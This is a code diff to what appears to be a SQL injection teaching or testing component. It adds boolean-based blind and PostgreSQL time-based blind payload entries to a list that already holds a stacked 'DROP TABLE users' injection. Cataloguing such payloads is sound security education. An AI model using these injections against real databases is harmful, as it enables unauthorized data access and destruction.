@@ -46,6 +46,18 @@ function SQLiTest() {
             description: "Execute a second separate query. DANGEROUS.",
             code: "'; DROP TABLE users; --",
             context: "Input allowing stacked queries (PostgreSQL often supports this)"
+        },
+        {
+            title: "Boolean-Based Blind",
+            description: "Infer data by asking true/false questions (e.g., does 1=1?).",
+            code: "' AND (SELECT 1)=1 --",
+            context: "Any Input where output changes based on True/False"
+        },
+        {
+            title: "Time-Based Blind (PostgreSQL)",
+            description: "Infer data by measuring response time (e.g., sleep 5 seconds).",
+            code: "'; SELECT pg_sleep(5); --",
+            context: "Any Input (when errors are hidden)"
         }
     ];
 
